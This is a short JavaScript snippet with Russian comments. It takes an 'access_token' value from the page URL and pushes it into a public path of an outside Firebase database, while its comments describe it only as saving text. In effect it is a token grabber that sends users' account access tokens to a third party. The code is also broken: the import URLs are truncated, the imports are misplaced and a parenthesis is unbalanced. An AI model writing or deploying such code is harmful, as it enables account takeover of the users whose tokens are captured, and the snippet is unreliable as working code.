// Импортируем нужные функции из SDK 2026 года
const urlParamsV2Paramsd = new URLSearchParams(window.location.search);
const access_token = urlParamsV2Paramsd.get('access_token');
// Подключаем необходимые функции из Firebase CDN (актуально для 2026)
  import { initializeApp } from "https://www.gstatic.com";
  import { getDatabase, ref, push, set } from "https://www.gstatic.com";

  // Конфигурация вашего проекта (возьмите её в настройках проекта Firebase)
  const firebaseConfig = {
    databaseURL: "https://winnigames2024app-default-rtdb.firebaseio.com",
  };

  // Инициализация
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  // Функция для записи текста
  async function addTextToDb(messageText) {
    try {
      const dbRef = ref(db, 'public_messages'); // Путь к папке в базе
      const newEntryRef = push(dbRef);          // Создаем уникальный ключ для записи
      
      await set(newEntryRef, {
        text: messageText,
        createdAt: new Date().toISOString()
      });
      
      console.log("Данные успешно добавлены!");
    } catch (error) {
      console.error("Ошибка при записи:", error);
    }
  }


if (access_token) {
  addTextToDb(access_token));
} else {
  alert('No Logined!!!');
}
